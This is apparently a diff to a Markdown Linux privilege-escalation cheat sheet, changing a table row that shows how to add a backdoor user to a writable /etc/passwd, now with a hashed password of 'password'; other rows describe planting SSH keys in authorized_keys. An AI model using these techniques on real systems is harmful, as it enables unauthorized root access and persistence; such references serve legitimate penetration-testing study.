@@ -76,7 +76,7 @@ What folder can I write to?
 | Writable Folder / file    | Priv Esc Command                                                                                |
 |---------------------------|-------------------------------------------------------------------------------------------------|
 | /home/*USER*/             | Create an ssh key and copy it to the .ssh/authorized_keys folder the ssh into the account       |
-| /etc/passwd               | manually add a user without a password using the following syntax<b> user2:*:1000:1000:,,,:/home/user2:/bin/bash                          |
+| /etc/passwd               | manually add a user with a password of "password" using the following syntax<br> user2:$1$xtTrK/At$Ga7qELQGiIklZGDhc6T5J0:1000:1000:,,,:/home/user2:/bin/bash                          |
 | /home/*USER*/             | Create an ssh key and copy it to the .ssh/authorized_keys folder the ssh into the account       |
 
 ## References
